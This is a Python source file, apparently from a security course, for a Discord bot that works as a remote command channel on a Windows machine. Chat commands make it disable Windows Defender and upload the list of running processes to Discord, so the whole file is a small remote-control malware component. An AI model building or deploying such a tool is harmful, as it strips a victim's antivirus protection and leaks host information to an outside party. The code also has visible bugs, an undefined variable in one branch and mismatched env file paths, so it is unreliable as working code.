import discord
import dotenv
import time
from week_1.disable_defender import show_running_processes, disable_defender

# laden van env variables
DISCORD_BOT_ID = dotenv.get_key("week_2/.env", "DISCORD_BOT_ID")
DISCORD_SERVER_NAME = dotenv.get_key("week2/.env", "DISCORD_SERVER_NAME")
print(DISCORD_BOT_ID)
print(DISCORD_SERVER_NAME)


def start_bot():
    intents = discord.Intents.default()
    intents.message_content = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        for guild in client.guilds:
            if guild.name == DISCORD_SERVER_NAME:
                break
        print(f"Client: {client.user}\n Guild: {
              guild.id}, Guild Name: {guild.name}")

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return
        if message.content.startswith('$help'):
            await message.channel.send('commands: $dd: disables windows defender\n $ps: shows running processes')

        if message.content.startswith('$dd'):
            await message.channel.send(disable_defender())

        if message.content.startswith('$ps'):
            result = show_running_processes()
            if len(result) >= 4000:
                with open("process_list.txt", 'w') as file:
                    file.write(result)
                time.sleep(1)
            await message.channel.send("Running processes: ", file=discord.File("process_list.txt"))
        else:
            await message.channel.send(result)

    client.run(DISCORD_BOT_ID)


if __name__ == '__main__':
    start_bot()
